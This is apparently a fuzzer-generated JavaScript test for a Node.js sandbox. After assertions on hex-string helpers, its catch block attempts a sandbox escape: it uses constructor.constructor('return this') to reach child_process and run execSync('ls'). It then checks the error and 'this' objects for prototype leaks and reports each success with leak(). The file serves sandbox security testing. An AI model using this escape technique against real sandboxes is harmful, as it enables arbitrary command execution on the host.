try {
    assert.sameValue(decimalToHexString(-1), 'FFFFFFFF');
    assert.sameValue(decimalToHexString(0.5), '0000');
    assert.sameValue(decimalToHexString(1), '0001');
    assert.sameValue(decimalToHexString(100), '0064');
    assert.sameValue(decimalToHexString(65535), 'FFFF');
    assert.sameValue(decimalToHexString(65536), '10000');
    assert.sameValue(decimalToPercentHexString(-1), '%FF');
    assert.sameValue(decimalToPercentHexString(0.5), '%00');
    assert.sameValue(decimalToPercentHexString(1), '%01');
    assert.sameValue(decimalToPercentHexString(100), '%64');
    assert.sameValue(decimalToPercentHexString(65535), '%FF');
    assert.sameValue(decimalToPercentHexString(65536), '%00');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}